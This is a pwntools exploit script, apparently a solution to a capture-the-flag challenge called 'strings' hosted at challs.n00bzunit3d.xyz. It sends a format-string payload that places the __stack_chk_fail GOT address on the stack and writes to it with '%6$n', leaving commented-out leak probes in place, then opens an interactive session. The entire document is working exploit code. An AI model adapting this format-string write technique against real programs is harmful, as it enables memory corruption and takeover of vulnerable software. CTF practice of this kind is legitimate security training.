from pwn import *

binary = context.binary = ELF("./strings")
libc = ELF("./libc.so")
ld = ELF("./ld.so")

if args.REMOTE:
    p = remote('challs.n00bzunit3d.xyz', 7150)
elif args.GDB:
    p = gdb.debug([ld.path, binary.path], env={"LD_PRELOAD":libc.path})
else:
    p = process([ld.path, binary.path], env={"LD_PRELOAD":libc.path})

# main = 0x4012b3
# stackcheckfail got = 0x404020

payload = b"\x20\x40\x40\x00\x00\x00\x00\x00"
# payload = b"\xff\xff\xff\xff\xff\xff\xff\xff"
# payload += b" %p" * 10
payload += b"%6$n"

p.send(payload)

p.interactive()